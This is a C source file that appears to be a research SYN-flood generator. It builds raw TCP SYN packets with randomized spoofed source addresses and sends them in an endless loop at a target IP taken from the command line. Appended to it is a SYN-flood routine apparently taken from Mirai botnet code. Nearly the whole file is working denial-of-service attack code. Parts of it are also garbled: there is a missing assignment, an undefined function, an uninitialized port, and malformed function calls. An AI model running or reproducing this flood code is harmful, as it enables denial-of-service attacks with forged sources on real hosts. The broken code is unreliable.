/*
Generate a TCP SYN flood

For research purposes only, please use responsibly

Author: Samuel DeLaughter
License: MIT
*/


#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <errno.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <time.h>
#include <linux/if_ether.h>


#define DEBUG 0 // Set verbosity
#define DELAY 0 // Set delay between packets in seconds
#define RAND_SRC_ADDR 1 // Toggle source address randomization
#define RAND_SRC_PORT 0 // Toggle source port randomization
#define INCREMENT_ID 1 // Toggle incrementing of IP ID field
#define FAST_CSUM 0 // Toggle fast checksum updating (experimental)

#define PROTO_TCP_OPT_NOP   1
#define PROTO_TCP_OPT_MSS   2
#define PROTO_TCP_OPT_WSS   3
#define PROTO_TCP_OPT_SACK  4
#define PROTO_TCP_OPT_TSVAL 8

/*
  Maximum total packet size.  This could be larger, but packets over 1500 bytes
	may exceed some path MTUs.  Plus a standard SYN packet (including the IP
	header) is only 40 bytes, and at most 100.  Other attack packets also tend to
	be very small in order to maximize per-packet overhead in the network.
*/
const uint32_t MAX_PACKET_SIZE = 1500;

// Default Source IP, in case we aren't randomizing
const char default_src_addr[32] = "127.0.0.1";

// Destination IP, unless otherwise specified with argv[1]
const char default_dst_addr[32] = "127.0.0.1";

// Default Source Port, in case we aren't randomizing
const uint16_t default_src_port = 9000;

// Destination Port, unless otherwise specified with argv[2]
const uint16_t default_dst_port = 80;

volatile int busy_wait_var;

struct pseudo_header {
	u_int32_t source_address;
	u_int32_t dest_address;
	u_int8_t placeholder;
	u_int8_t protocol;
	u_int16_t tcp_length;
};

static void update_ip_csum(struct iphdr* iph, __be32 old_saddr) {
  if (old_saddr == iph->saddr){
    return;
  }
  __sum16 sum =  + (~ntohs(*(unsigned short *)&iph->saddr) & 0xffff);
  sum += ntohs(iph->check);
  sum = (sum & 0xffff) + (sum>>16);
  iph->check = htons(sum + (sum>>16) + 1);
}

static void update_tcp_csum(struct iphdr* iph, struct tcphdr* tcph, __be32 old_saddr) {
  if (old_saddr == iph->saddr){
    return;
  }
  __sum16 sum =  + (~ntohs(*(unsigned short *)&iph->saddr) & 0xffff);
  sum += ntohs(tcph->check);
  sum = (sum & 0xffff) + (sum>>16);
  tcph->check = htons(sum + (sum>>16) + 1);
}

static uint32_t random_ipv4(void) {
  // Adapted from Mirai (https://github.com/jgamblin/Mirai-Source-Code)
  uint32_t addr;
  uint8_t o1, o2, o3, o4;

  do {
    addr = (uint32_t)(rand());
    o1 = addr & 0xff;
    o2 = (addr >> 8) & 0xff;
    o3 = (addr >> 16) & 0xff;
    o4 = (addr >> 24) & 0xff;
  }

  while (
    // Skip private and reserved addresses, and DETERLab's network
    // https://en.wikipedia.org/wiki/Reserved_IP_addresses#IPv4

    (o1 == 0) ||								// 0.0.0.0/8		- Current Network
    (o1 == 10) ||								// 10.0.0.0/8		- Private
    (o1 == 100 && o2 >= 64 && o2 < 128) ||		// 100.64.0.0/10	- Carrier grade NAT
    (o1 == 127) ||								// 127.0.0.0/8		- Loopback
    (o1 == 169 && o2 == 254) ||					// 169.254.0.0/16	- Link-local
    (o1 == 172 && o2 >= 16 && o2 < 32) ||		// 172.16.0.0/12	- Private
    (o1 == 192 &&	(
			(o2 == 0 && (
				o3 == 0 ||						// 192.0.0.0/24		- Private
				o3 == 2							// 192.0.2.0/24		- Documentation
			)) ||
			(o2 == 88 && o3 == 99) ||			// 192.88.99.0/24	- Reserved
			(o2 == 168)							// 192.168.0.0/16	- Private
		)) ||
    (o1 == 198 && (
			(o2 == 18 || o2 == 19) ||			// 198.18.0.0/15	- Private
			(o2 == 51 && o3 == 100)				// 198.51.100.0/24	- Documentation
		)) ||
    (o1 == 203 && o2 == 0 && o3 == 113) ||		// 203.0.113.0/24	- Documentation
		(o1 == 206 && o2 == 117 && o3 == 25) ||	// 206.117.25.0/24	- DeterLab
		(o1 == 206 && o2 == 117 && o3 == 31) ||	// 206.117.31.0/24	- DeterLab High Performance
    (o1 >= 224)									// 224.0.0.0+		- Various multicast/reserved
  );
  return addr;
}

static uint16_t random_port(void) {
	uint16_t port = (uint16_t)(rand()) & 0xff;
	return port;
}

unsigned short csum(unsigned short *ptr,int nbytes) {
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum=0;
	while(nbytes>1) {
		sum+=*ptr++;
		nbytes-=2;
	}
	if(nbytes==1) {
		oddbyte=0;
		*((u_char*)&oddbyte)=*(u_char*)ptr;
		sum+=oddbyte;
	}

	sum = (sum>>16)+(sum & 0xffff);
	sum = sum + (sum>>16);
	answer=(short)~sum;

	return(answer);
}

int main(int argc, char *argv[]) {
	// Create a raw socket
	int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);

	if(s == -1) {
		// Socket creation failed, may be because of non-root privileges
		perror("Failed to create socket, do you have root priviliges?");
		exit(1);
	}

	// Get target (and optionally source) IP address
	char dst_addr[32];
	uint16_t dst_port;
	uint32_t busy_wait;

	if (argc > 1) {
		strcpy(dst_addr, argv[1]);
	} else {
    printf("Please specify a target IP address, and optionally a port number (default destination port is 80).\nExample usage: syn_flood 127.0.0.1 80\n");
		exit(1);
	}

	// if (argc > 2) {
	// 	dst_port = (uint16_t)atoi(argv[2]);
	// } else {
	// 	dst_port = default_dst_port;
	// }

	if (argc > 2) {
		busy_wait = (uint32_t)atoi(argv[2]);
	} else {
		busy_wait = 0;
	}

	if (busy_wait < 0) {
		#if DEBUG
			printf("Received negative value for busywait parameter %u, exiting.\n", busy_wait);
		#endif
		return 1;
	}


	#if DEBUG
		printf ("Flooding target %s:%u\n", dst_addr, dst_port);

		#if RAND_SRC_ADDR
			printf("Randomizing source address\n");
		#else
			printf("Using source address %s\n", default_src_addr);
		#endif

		#if RAND_SRC_PORT
			printf("Randomizing source port\n");
		#else
			printf("Using source port %u\n", default_src_port);
		#endif
	#endif


  // Seed RNG
  srand(time(NULL));

	// Byte array to hold the full packet
	char datagram[MAX_PACKET_SIZE];

	// Pointer for the packet payload
	char *data;

	// Pointer for the pseudo-header used in TCP checksum
	char *pseudogram;

	// Zero out the packet buffer
	memset (datagram, 0, MAX_PACKET_SIZE);

	// Initialize headers
	struct iphdr *iph = (struct iphdr *) datagram;
	struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
	uint8_t *opts (uint8_t *)(tcph + 1);
	struct pseudo_header psh;

	// TCP Payload
	data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr);
	strcpy(data, "");

	// Address resolution
	struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(dst_port);
	sin.sin_addr.s_addr = inet_addr(dst_addr);

	// Fill in the IP Header
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr) + strlen(data);
	iph->id = htonl(0);	//Id of this packet, can be any value
	iph->frag_off = 0;
	iph->ttl = 64;
	iph->protocol = IPPROTO_TCP;
	iph->check = 0;		//Set to 0 before calculating checksum
	iph->saddr = inet_addr(default_src_addr);
	iph->daddr = sin.sin_addr.s_addr;

	// IP checksum
	iph->check = csum ((unsigned short *) datagram, iph->tot_len);

	// TCP Header
	tcph->source = htons(default_src_port);
	tcph->dest = sin.sin_port;
	tcph->seq = 0;
	tcph->ack_seq = 0;
	tcph->doff = 5; // TCP Header Size in 32-bit words (5-15)
	tcph->fin=0;
	tcph->syn=1;
	tcph->rst=0;
	tcph->psh=0;
	tcph->ack=0;
	tcph->urg=0;
	tcph->window = htons(65535); // Maximum possible window size (without scaling)
	tcph->check = 0;
	tcph->urg_ptr = 0;

	// TCP MSS
	*opts++ = PROTO_TCP_OPT_MSS;    // Kind
	*opts++ = 4;                    // Length
	*((uint16_t *)opts) = htons(1400 + (rand_next() & 0x0f));
	opts += sizeof (uint16_t);

	// TCP SACK permitted
	*opts++ = PROTO_TCP_OPT_SACK;
	*opts++ = 2;

	// TCP timestamps
	*opts++ = PROTO_TCP_OPT_TSVAL;
	*opts++ = 10;
	*((uint32_t *)opts) = rand_next();
	opts += sizeof (uint32_t);
	*((uint32_t *)opts) = 0;
	opts += sizeof (uint32_t);

	// TCP nop
	*opts++ = 1;

	// TCP window scale
	*opts++ = PROTO_TCP_OPT_WSS;
	*opts++ = 3;
	*opts++ = 6; // 2^6 = 64, window size scale = 64

	// TCP checksum
	psh.source_address = inet_addr(default_src_addr);
	psh.dest_address = sin.sin_addr.s_addr;
	psh.placeholder = 0;
	psh.protocol = IPPROTO_TCP;
	psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(data));

	int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(data);
	pseudogram = malloc(psize);

	memcpy(pseudogram, (char*) &psh, sizeof (struct pseudo_header));
	memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr) + strlen(data));

	tcph->check = csum((unsigned short*) pseudogram, psize);

	//IP_HDRINCL to tell the kernel that headers are included in the packet
	int option_value = 1;
	if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, (void *)&option_value, sizeof(option_value)) < 0) {
		perror("Error setting IP_HDRINCL");
		exit(1);
	}

	__be32 old_saddr;
	__be32 new_saddr;
	// Generate packets forever, the caller must terminate this program manually
	while(1) {
		#if RAND_SRC_ADDR || RAND_SRC_PORT || INCREMENT_ID
			#if RAND_SRC_ADDR
			// Generate a new random source IP, excluding certain prefixes
	    	new_saddr = (__be32)(random_ipv4());
			#endif

			#if RAND_SRC_PORT
				tcph->source = random_port();
			#endif

			#if INCREMENT_ID
				iph->id = htons(ntohs(iph->id) + 1);
			#endif

			#if FAST_CSUM
				/*
				In theory these functions could enable faster floods by updating
				checksums to account for modifications rather than recomputing
				checksums from scratch for each packet.  The downside is that they only
				allow chanigng a single header field at a time, which is currently
				hard-coded to be the source IP.  Additionally, the speedup appears to be
				irrelevant -- there is some other bottleneck in packet generation that
				limits us to ~150,000 packets per second on current-gen hardware, even
				with multi-threading.
				*/
		    old_saddr = iph->saddr;
				update_ip_csum(struct iphdr* iph, __be32 old_saddr);
	    	update_tcp_csum(struct iphdr* iph, struct tcphdr* tcph, __be32 old_saddr);
			#else
		    iph->check = 0;
		    iph->saddr = new_saddr;
		    iph->check = csum ((unsigned short *) datagram, iph->tot_len);

		    tcph->check = 0;
				tcph->seq = new_saddr;
		    psh.source_address = new_saddr;
		    memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
		  	memcpy(pseudogram + sizeof(struct pseudo_header) , tcph , sizeof(struct tcphdr) + strlen(data));
		  	tcph->check = csum( (unsigned short*) pseudogram , psize);
			#endif
		#endif

		// Send the packet
		if (sendto (s, datagram, iph->tot_len ,	0, (struct sockaddr *) &sin, sizeof (sin)) < 0) {
			perror("Error sending packet");
		}

		#if DEBUG > 1
			printf("Sent packet from %s:%u to %s:%u\n", iph->saddr, tcph->source, iph->daddr, tcph->dest);
		#endif

		#if DELAY
    	sleep(DELAY);
		#endif

		if (busy_wait) {
			for (int i=0; i<busy_wait; i++) {
				busy_wait_var += 1;
			}
		}
	}

	return 0;
}


void attack_tcp_syn(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts) {
    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint32_t seq = attack_get_opt_int(opts_len, opts, ATK_OPT_SEQRND, 0xffff);
    uint32_t ack = attack_get_opt_int(opts_len, opts, ATK_OPT_ACKRND, 0);
    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, FALSE);
    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, FALSE);
    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, FALSE);
    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, FALSE);
    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, TRUE);
    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, FALSE);
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting attack\n");
#endif
        return;
    }
    
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n");
#endif
        close(fd);
        return;
    }

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct tcphdr *tcph;
        uint8_t *opts;

        pkts[i] = calloc(128, sizeof (char));
        iph = (struct iphdr *)pkts[i];
        tcph = (struct tcphdr *)(iph + 1);
        opts = (uint8_t *)(tcph + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + 20);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_TCP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;

        tcph->source = htons(sport);
        tcph->dest = htons(dport);
        tcph->seq = htons(seq);
        tcph->doff = 10;
        tcph->urg = urg_fl;
        tcph->ack = ack_fl;
        tcph->psh = psh_fl;
        tcph->rst = rst_fl;
        tcph->syn = syn_fl;
        tcph->fin = fin_fl;

        // TCP MSS
        *opts++ = PROTO_TCP_OPT_MSS;    // Kind
        *opts++ = 4;                    // Length
        *((uint16_t *)opts) = htons(1400 + (rand_next() & 0x0f));
        opts += sizeof (uint16_t);

        // TCP SACK permitted
        *opts++ = PROTO_TCP_OPT_SACK;
        *opts++ = 2;

        // TCP timestamps
        *opts++ = PROTO_TCP_OPT_TSVAL;
        *opts++ = 10;
        *((uint32_t *)opts) = rand_next();
        opts += sizeof (uint32_t);
        *((uint32_t *)opts) = 0;
        opts += sizeof (uint32_t);

        // TCP nop
        *opts++ = 1;

        // TCP window scale
        *opts++ = PROTO_TCP_OPT_WSS;
        *opts++ = 3;
        *opts++ = 6; // 2^6 = 64, window size scale = 64
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            
            // For prefix attacks
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

            if (source_ip == 0xffffffff)
                iph->saddr = rand_next();
            if (ip_ident == 0xffff)
                iph->id = rand_next() & 0xffff;
            if (sport == 0xffff)
                tcph->source = rand_next() & 0xffff;
            if (dport == 0xffff)
                tcph->dest = rand_next() & 0xffff;
            if (seq == 0xffff)
                tcph->seq = rand_next();
            if (ack == 0xffff)
                tcph->ack_seq = rand_next();
            if (urg_fl)
                tcph->urg_ptr = rand_next() & 0xffff;

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + 20), sizeof (struct tcphdr) + 20);

            targs[i].sock_addr.sin_port = tcph->dest;
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + 20, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }
#ifdef DEBUG
            break;
            if (errno != 0)
                printf("errno = %d\n", errno);
#endif
    }
}